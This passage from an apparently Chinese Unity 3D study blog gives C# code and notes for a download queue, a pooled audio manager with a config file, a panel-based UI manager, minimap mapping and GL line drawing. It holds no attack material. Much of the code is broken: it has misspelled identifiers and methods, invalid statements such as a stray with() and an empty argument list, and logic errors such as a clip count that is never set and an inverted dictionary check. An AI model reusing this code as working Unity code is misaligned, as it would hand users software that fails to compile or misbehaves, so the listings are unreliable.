<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title">WWWHelper</span>: <span class="title">MonoBehaviour</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> WWWHelper Instance;</span><br><span class="line"></span><br><span class="line">    Queue&lt;WWWItem&gt; allTask;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">Start</span>()</span>&#123;</span><br><span class="line">        Instance = <span class="keyword">this</span>;</span><br><span class="line">        allTask = <span class="keyword">new</span> Queue&lt;WWWItem&gt;();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">AddTask</span>(<span class="params">WWWItem item</span>)</span>&#123;</span><br><span class="line">        allTask.Enqueue(item);</span><br><span class="line">        <span class="keyword">if</span>(allTask.Count == <span class="number">1</span>)&#123;</span><br><span class="line">            StartCoroutine(DownloadItems());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> IEnumerator <span class="title">DownloadItems</span>()</span>&#123;</span><br><span class="line">        <span class="keyword">while</span>(allTask.Count &gt; <span class="number">0</span>)&#123;</span><br><span class="line">            WWWItem item = allTask.Dqeueue();</span><br><span class="line">            <span class="keyword">yield</span> <span class="keyword">return</span> item.Download();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>下载TXT文件模块：</p>
<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title">WWWTxt</span>: <span class="title">WWWItem</span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">WWWText</span>(<span class="params"><span class="built_in">string</span> url</span>)</span>&#123;</span><br><span class="line">        url = InitUrl(url);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="built_in">string</span> <span class="title">InitUrl</span>(<span class="params"><span class="built_in">string</span> url</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(Application.platform == RuntimePlatform.WindowsEditor</span><br><span class="line">        || Application.platform == RuntimePlatform.WindowsPlayer)&#123;</span><br><span class="line">            url = <span class="string">&quot;file:///&quot;</span> + url;</span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span>(Application.platform == RuntimePlatform.Android)&#123;</span><br><span class="line">            url = <span class="string">&quot;jar:file://&quot;</span> + url;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            url = <span class="string">&quot;file://&quot;</span> + url;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> url;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">override</span> <span class="keyword">void</span> <span class="title">BeginDownload</span>()</span>&#123;</span><br><span class="line">        Debug.Log(<span class="string">&quot;Start ...&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">override</span> <span class="keyword">void</span> <span class="title">DownlaodFinish</span>(<span class="params">WWW www</span>)</span>&#123;</span><br><span class="line">        Debug.Log(www.txt);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">override</span> <span class="keyword">void</span> <span class="title">DownloadError</span>(<span class="params">WWWItem item</span>)</span>&#123;</span><br><span class="line">        WWWHelper.Instance.AddTast(item);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>使用：</p>
<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="built_in">string</span> url = Application.dataPath + <span class="string">&quot;/filename&quot;</span>;</span><br><span class="line">WWWTxt txtTask = <span class="keyword">new</span> WWWTxt(url);</span><br><span class="line">WWWHelper.Instance.AddTask(txtTask);</span><br></pre></td></tr></table></figure>

<h3 id="音效模块"><a href="#音效模块" class="headerlink" title="音效模块"></a>音效模块</h3><p>需要监听者，声源。</p>
<p>Audio Listener：相当于摄像机，唯一。</p>
<p>Audio Source：可以播放Audio Clip，非常占用空间，继承MonoBehavior，属性较多。</p>
<h2 id="因此：-应该使用有限个Audio-Source播放所有Clips（对象池）"><a href="#因此：-应该使用有限个Audio-Source播放所有Clips（对象池）" class="headerlink" title="因此：- 应该使用有限个Audio Source播放所有Clips（对象池）"></a>因此：<br>- 应该使用有限个Audio Source播放所有Clips（对象池）</h2><p>Audio 模块：</p>
<ul>
<li>SourceManager：管理AudioSoruce对象，寻找空闲的对象，播放Clip<ul>
<li>拿出空闲的Audio Source</li>
<li>释放空闲的Audio Source</li>
<li>播放或停止播放</li>
</ul>
</li>
<li>AudioSoruce：3个</li>
<li>ClipsManager：管理Clip对象<ul>
<li>有名字作为索引</li>
<li>通过配置文件读取</li>
<li>加载到内存</li>
</ul>
</li>
<li>Clip：无数个</li>
</ul>
<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title">AudioManger</span>: <span class="title">MonoBehaviour</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> AudioManger Instance;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> SourceManager sourceManager;</span><br><span class="line">    <span class="keyword">private</span> ClipManager clipManager;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">Start</span>()</span>&#123;</span><br><span class="line">        Instance = <span class="keyword">this</span>;</span><br><span class="line">        sourceManager = <span class="keyword">new</span> SourceManager(gameObject);</span><br><span class="line">        clipManager = <span class="keyword">new</span> ClipManager();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">Play</span>(<span class="params"><span class="built_in">string</span> audioName</span>)</span>&#123;</span><br><span class="line">        AudioSource source = sourceManage.GetFreeAudio();</span><br><span class="line">        SingleClip singleClip = clipManager.FindClipByName(audioName);</span><br><span class="line">        singleClip.Play(source);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">Stop</span>(<span class="params"><span class="built_in">string</span> audioName</span>)</span>&#123;</span><br><span class="line">        sourceManager.Stop(audioName);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title">SourceManager</span>&#123;</span><br><span class="line">    List&lt;AudioSource&gt; allSources;</span><br><span class="line">    GameObject owner;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">SourceManager</span>(<span class="params">GameObject own</span>)</span>&#123;</span><br><span class="line">        owner = own;</span><br><span class="line">        InitAudioSourceList();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">InitAudioSourceList</span>()</span>&#123;</span><br><span class="line">        allSources = <span class="keyword">new</span> List&lt;AudioSource&gt;();</span><br><span class="line">        <span class="keyword">for</span>(<span class="built_in">int</span> i=<span class="number">0</span>;i&lt;<span class="number">3</span>;i++)&#123;</span><br><span class="line">            AudioSource source = owner.AddComponent&lt;AudioSource&gt;();</span><br><span class="line">            allSources.Add(source);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> AudioSource <span class="title">GetFreeAudio</span>()</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">int</span> i=<span class="number">0</span>;i&lt;allSources.Count;i++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(!allSources[i].isPlaying)&#123;</span><br><span class="line">                <span class="keyword">return</span> allSources[i];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        AudioSource source = owner.AddComponent&lt;AudioSouce&gt;();</span><br><span class="line">        allSources.Add(source);</span><br><span class="line">        <span class="keyword">return</span> source;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">ReleaseFreeAudio</span>()</span>&#123;</span><br><span class="line">        <span class="built_in">int</span> cnt = <span class="number">0</span>;</span><br><span class="line">        List&lt;AudioSource&gt; releaseSources = <span class="keyword">new</span> List&lt;AudioSource&gt;();</span><br><span class="line">        <span class="keyword">for</span>(<span class="built_in">int</span> i=<span class="number">0</span>;i&lt;allSources.Count;i++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(!allSources[i].isPlaying)&#123;</span><br><span class="line">                cnt++;</span><br><span class="line">                <span class="keyword">if</span>(cnt &gt; <span class="number">3</span>)&#123;</span><br><span class="line">                    releaseSources.Add(allSources[i]);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;releaseSources.Count;i++)&#123;</span><br><span class="line">            allSources.Remove(releaseSources[i]);</span><br><span class="line">            GameObject.Destroy(releaseSources[i]);</span><br><span class="line">        &#125;</span><br><span class="line">        releaseSources.Clear();</span><br><span class="line">        releaseSources = <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">Stop</span>(<span class="params"><span class="built_in">string</span> name</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="built_in">int</span> i=<span class="number">0</span>;i&lt;allSources.Count;i++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(allSources[i].isPlaying &amp;&amp;</span><br><span class="line">            allSources[i].clip.name.Equals(name))&#123;</span><br><span class="line">                allSources[i].Stop();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title">ClipManager</span>&#123;</span><br><span class="line">    <span class="comment">// 从配置文件加载</span></span><br><span class="line">    <span class="built_in">string</span>[] clipName = <span class="literal">null</span>;</span><br><span class="line">    <span class="built_in">string</span>[] clipFile = <span class="literal">null</span>;</span><br><span class="line">    <span class="built_in">int</span> clipCount = <span class="number">0</span>; </span><br><span class="line"></span><br><span class="line">    SingleClip[] allSingleClip;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">ClipManager</span>()</span>&#123;</span><br><span class="line">        ReadConfigFile();</span><br><span class="line">        LoadClips();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">ReadConfigFile</span>()</span>&#123;</span><br><span class="line">        <span class="keyword">var</span> fileAddress = Application.streamingAssertsPath + <span class="string">&quot;/AudioConfig.txt&quot;</span>;</span><br><span class="line">        FileInfo info = <span class="keyword">new</span> FileInfo(fileAddress);</span><br><span class="line">        <span class="keyword">if</span>(info.Exists)&#123;</span><br><span class="line">            <span class="keyword">with</span>()</span><br><span class="line">            StreamReader sr = <span class="keyword">new</span> StreamReader(fileAddress);</span><br><span class="line">            <span class="built_in">string</span> lineCountStr = sr.ReadLine();</span><br><span class="line">            <span class="built_in">int</span> lineCount = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">if</span>(<span class="built_in">int</span>.TryParse(lineCountStr, <span class="keyword">out</span> lineCount))&#123;</span><br><span class="line">                clipName = <span class="keyword">new</span> <span class="built_in">string</span>[lineCount];</span><br><span class="line">                clipFile = <span class="keyword">new</span> <span class="built_in">string</span>[lineCount];</span><br><span class="line">                <span class="keyword">for</span>(<span class="built_in">int</span> i=<span class="number">0</span>;i&lt;lineCount;i++)&#123;</span><br><span class="line">                    <span class="built_in">string</span>[] line = sr.ReadLine().Split(<span class="string">&quot;\t&quot;</span>.ToCharArray());</span><br><span class="line">                    clipName[i] = line[<span class="number">0</span>];</span><br><span class="line">                    clipFile[i] = line[<span class="number">1</span>];</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="comment">// Read Error</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">LoadClips</span>()</span>&#123;</span><br><span class="line">        allSingleClip = <span class="keyword">new</span> SingleClip[clipCount];</span><br><span class="line">        <span class="keyword">for</span>(<span class="built_in">int</span> i=<span class="number">0</span>;i&lt;clipCount;i++)&#123;</span><br><span class="line">            AudioClip clip = Resources.Load&lt;AudioClip&gt;(clipFile[i]);</span><br><span class="line">            SingleClip sclip = <span class="keyword">new</span> SingleClip(clip);</span><br><span class="line">            allSingleClip[i] = sclip;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> SingleClip <span class="title">FindClipByName</span>(<span class="params"><span class="built_in">string</span> name</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="built_in">int</span> i=<span class="number">0</span>;i&lt;clipCount;i++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(clipName[i] == name)&#123;</span><br><span class="line">                <span class="keyword">return</span> allSingleClip[i];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<p>配置文件<code>AudioConfig.txt</code>：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">3</span><br><span class="line">ClipButton  ClipButton.mp3</span><br><span class="line">River   River.mp3</span><br><span class="line">UIMusic UIMusic.mp3</span><br></pre></td></tr></table></figure>


<p>Clip 存储：</p>
<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title">SingleClip</span>&#123;</span><br><span class="line">    AudioClip clip;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">SingleClip</span>(<span class="params">AudioClip tclip</span>)</span>&#123;</span><br><span class="line">        clip = tclip;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">Play</span>(<span class="params">AudioSource source</span>)</span>&#123;</span><br><span class="line">        source.clip = clip;</span><br><span class="line">        source.play();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="UI-模块"><a href="#UI-模块" class="headerlink" title="UI 模块"></a>UI 模块</h3><p>从效果图入手，切图成为碎图。<br>使用Texture Packer打大图：</p>
<p>Data Format：Unity Texture2D<br>Texture format：PNG<br>Image format：RGBA8888: 每个通道8bit。</p>
<p>Geometry<br>Max Size：<code>2048*2048 (1024*1024)</code></p>
<p>其他保持默认，然后将碎图文件夹拖入其中，得到拼图（tpsheet）</p>
<p>在Unity中，加载插件<code>codeandweb.com</code>放入根目录。</p>
<p>之后根据拼图拼UI，以Panel为单位。</p>
<p>使用时，使用九宫格拉伸。</p>
<p>最后写代码：</p>
<p>Controller:<br>UIManager管理所有Panel及其子控件。<br>Panel包含部分子控件。<br>子控件消息通信通过UIManager直接查询对方。<br>子控件主动报告数据。</p>
<p>子控件设计：实现UIBehaviour，实现向UIManager注册自己<br>UIManager：被注册后，以Panel为单位划分，挂载子控件。</p>
<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title">UIBehaviour</span>: <span class="title">MonoBehaviour</span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">Awake</span>()</span>&#123;</span><br><span class="line">        <span class="keyword">var</span> panel = transform.GetComponentInParent&lt;UIBase&gt;();</span><br><span class="line">        UIManager.Instance.RegistGameObject(panel, transform.name, gameObject)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">AddButtonListener</span>(<span class="params">UnityAction action</span>)</span>&#123;</span><br><span class="line">        Button btn = transform.GetComponent&lt;Button&gt;();</span><br><span class="line">        <span class="keyword">if</span>(btn != <span class="literal">null</span>)&#123;</span><br><span class="line">            btn.onClick.AddListener(action);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">AddDragInterface</span>(<span class="params">UnityAction&lt;BaseEventData&gt; action</span>)</span>&#123;</span><br><span class="line">        EventTrrigger trigger = gameObject.GetComponent&lt;EventTrigger&gt;();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(trigger == <span class="literal">null</span>)&#123;</span><br><span class="line">            trigger = gameObject.AddComponent&lt;EventTrigger&gt;();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        EventTrigger.Entry entry = EventTrigger.Entry();</span><br><span class="line">        entry.eventID = EventTriggerType.Drag;</span><br><span class="line">        entry.callback = <span class="keyword">new</span> EventTrigger.TriggerEvent();</span><br><span class="line">        entry.callback.AddListener(action);</span><br><span class="line">        trigger.triggers.Add(entry);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title">UIBase</span>: <span class="title">MonoBehaviour</span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">Awake</span>()</span>&#123;</span><br><span class="line">        Transform[] allChd = transform.GetComponentsInChildren&lt;Transform&gt;();</span><br><span class="line">        <span class="keyword">for</span>(<span class="built_in">int</span> i=<span class="number">0</span>;i&lt;allChd.Lenght;i++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(allChd[i].name.EndsWith(<span class="string">&quot;_N&quot;</span>))&#123;</span><br><span class="line">                allChd[i].gameObject.AddComponent&lt;UIBehaviour&gt;();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">OnDestory</span>()</span>&#123;</span><br><span class="line">        UIManager.Instance.UnRegistPanel(transform.name);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> GameObject <span class="title">GetWidget</span>(<span class="params"><span class="built_in">string</span> widget</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> UIManager.Instance.GetWidget(transform.name, widget);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> UIBehaviour <span class="title">GetBehaviour</span>(<span class="params"><span class="built_in">string</span> widget</span>)</span>&#123;</span><br><span class="line">        GameObject obj = GetWidget(widget);</span><br><span class="line">        <span class="keyword">if</span>(obj != <span class="literal">null</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> obj.GetComponent&lt;UIBehaviour&gt;();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">AddButtonListener</span>(<span class="params"><span class="built_in">string</span> widget, UnityAction action</span>)</span>&#123;</span><br><span class="line">        UIBehaviour bvr = GetBehaviour(widget);</span><br><span class="line">        <span class="keyword">if</span>(bvr != <span class="literal">null</span>)&#123;</span><br><span class="line">            bvr.AddButtonListener(action);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">AddDrag</span>(<span class="params"><span class="built_in">string</span> widget, UnityAction&lt;BaseEventData&gt; action</span>)</span>&#123;</span><br><span class="line">        UIBehaviour bvr = GetBehaviour(widget);</span><br><span class="line">        <span class="keyword">if</span>(bvr != <span class="literal">null</span>)&#123;</span><br><span class="line">            bvr.AddDragInterface(action);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title">UIManager</span>: <span class="title">MonoBehaviour</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> UIManager Instance;</span><br><span class="line">    <span class="comment">// 第一级表示Panel，第二级表示子控件</span></span><br><span class="line">    Dictionary&lt;<span class="built_in">string</span>, Dictionary&lt;<span class="built_in">string</span>, GameObject&gt;&gt; allWidgets;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">RegistGameObject</span>(<span class="params"><span class="built_in">string</span> panel, <span class="built_in">string</span> widget, GameObject obj</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(allWidgets.ContainsKey(panel))&#123;</span><br><span class="line">            allWidgets[panel] = <span class="keyword">new</span> Dictionary&lt;<span class="built_in">string</span>, Dictionary&lt;<span class="built_in">string</span>, GameObject&gt;();</span><br><span class="line">        &#125;</span><br><span class="line">        allWidgets[panel].Add(widget, obj)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">UnRegistGameObject</span>(<span class="params"><span class="built_in">string</span> panel, <span class="built_in">string</span> widget, GameObject obj</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(allWidgets.ContainsKey(panel))&#123;</span><br><span class="line">            <span class="keyword">if</span>(allWidgets[panel].ContainsKey(widget))&#123;</span><br><span class="line">                allWidgets[panel].Remove(widget);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">UnRegistPanel</span>(<span class="params"><span class="built_in">string</span> panel</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(allWidgets.ContainsKey(panel))&#123;</span><br><span class="line">            allWidgets[panel].Clear();</span><br><span class="line">            allWidgets[panel] = <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> GameObject <span class="title">GetWidget</span>(<span class="params"><span class="built_in">string</span> panel, <span class="built_in">string</span> widget</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(allWidgets.ContainsKey(panel))&#123;</span><br><span class="line">            <span class="keyword">return</span> allWidgets[panel][widget];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">Awake</span>()</span>&#123;</span><br><span class="line">        Instance = <span class="keyword">this</span>;</span><br><span class="line">        allWidgets = <span class="keyword">new</span> Dictionary&lt;<span class="built_in">string</span>, Dictionary&lt;<span class="built_in">string</span>, GameObject&gt;&gt;();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title">Regist</span>: <span class="title">UIBase</span>&#123;</span><br><span class="line">    RegistModel registModel;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">OnClick</span>()</span>&#123;</span><br><span class="line">        <span class="comment">// ...</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">Start</span>()</span>&#123;</span><br><span class="line">        AddButtonListener(<span class="string">&quot;btn_N&quot;</span>, OnClick);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Model:</p>
<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title">RegistModel</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">string</span> username;</span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">string</span> password;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>资源加载：<br>在Loading界面，要将资源加载到内存。用的时候再实例化。</p>
<p>在列表类的控件，会在子控件加载多个同类型的子单元控件。因此需要批量加载初始化。</p>
<p>现在让子控件称为UISubManager，来管理下级单位。</p>
<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title">UISubManager</span>: <span class="title">MonoBehaviour</span>&#123;</span><br><span class="line">    Dictionary&lt;<span class="built_in">string</span>, GameObject&gt; allChd;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">Awake</span>()</span>&#123;</span><br><span class="line">        UIBase bs = transform.GetComponetInParent&lt;UIBase&gt;();</span><br><span class="line">        UIManager.Instance.RegistGameObject(,)</span><br><span class="line"></span><br><span class="line">        Transform[] chd = transform.GetComponentsInChildren&lt;Transform&gt;();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="built_in">int</span> i=<span class="number">0</span>;i&lt;chd.Length;i++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(chd[i].name.EndsWith(<span class="string">&quot;_S&quot;</span>))&#123;</span><br><span class="line">                allChd.Add(chd[i].name, chd[i]);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Transform <span class="title">GetChidTransform</span>(<span class="params"><span class="built_in">string</span> widget</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> allChd[widget];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">OnDestory</span>()</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(allChd != <span class="literal">null</span>)&#123;</span><br><span class="line">            allChd.Clear();</span><br><span class="line">            allChd = <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="摇杆-EasyTouch"><a href="#摇杆-EasyTouch" class="headerlink" title="摇杆 EasyTouch"></a>摇杆 EasyTouch</h3><p>首先获取鼠标到圆心的距离，与方向。<br>考虑移动范围：圆内任意移动，不可超出圆。</p>
<h3 id="小地图"><a href="#小地图" class="headerlink" title="小地图"></a>小地图</h3><p>可以使用相机，修改属性：<br>Viewport Rect：显示在屏幕上的位置和大小<br>Depth：相机前后关系</p>
<p>但是以上方法渲染两次，消耗资源。</p>
<p>因此可以使用等比例映射，也就是用图片做小地图。</p>
<p>创建一张图片，使其（锚点）对齐到右上角。</p>
<p>然后让物体的位置映射到小地图上。</p>
<p>物体相对于地形的位置，按照比例缩小到小地图。</p>
<h3 id="GL"><a href="#GL" class="headerlink" title="GL"></a>GL</h3><p>GL.PushMatrix()<br>位置变换 GL.MultMatrix(transform.localToWorldMatrix)<br>正交投影 GL.LoadOrtho()<br>画线 GL.Begin(GL.LINES)<br>也可以画三角形，多边形等。<br>颜色 GL.Color(Color.red)<br>位置 GL.Vertex3(0.1f, 0.1f, 0)<br>结束 GL.End()<br>GL.PopMatrix()</p>
<h3 id="小地图上的摄像机可视区域"><a href="#小地图上的摄像机可视区域" class="headerlink" title="小地图上的摄像机可视区域"></a>小地图上的摄像机可视区域</h3><p>得到相机的可视区域，映射到小地图上面。</p>
<p>将相机的四个角对应到世界位置上：从相机的四个角发出4条射线到地面，得到4个交点。再映射到小地图。</p>
<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title">CameraView</span>: <span class="title">MonoBehaviour</span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">Update</span>()</span>&#123;</span><br><span class="line">        Ray first = Camera.main.ViewportPointToRay(Vector3.zero);</span><br><span class="line">        Ray second = Camera.main.ViewportPointToRay(Vector3.right);</span><br><span class="line">        Ray third = Camera.main.ViewportPointToRay(Vector3.one);</span><br><span class="line">        Ray forth = Camera.main.ViewportPointToRay(Vector3.up);</span><br><span class="line"></span><br><span class="line">        RaycastHit hitout;</span><br><span class="line">        <span class="keyword">if</span>(Physics.Raycast(first, <span class="keyword">out</span> hitout, <span class="number">1000</span>))&#123;</span><br><span class="line">            <span class="keyword">if</span>(hitout.transform.CompareTag(<span class="string">&quot;Ground&quot;</span>))&#123;</span><br><span class="line">                <span class="comment">// 得到世界坐标</span></span><br><span class="line">                hitout.point</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>


















]]></content>
      <categories>
        <category>游戏与3D</category>
      </categories>
      <tags>
        <tag>Unity 3D</tag>
      </tags>
  </entry>
  <entry>
    <title>阿里云物联网平台使用</title>
    <url>/2020/02/04/%E7%89%A9%E8%81%94%E7%BD%91/Ali-IOT/</url>
    <content><![CDATA[<p>…</p>
<span id="more"></span>

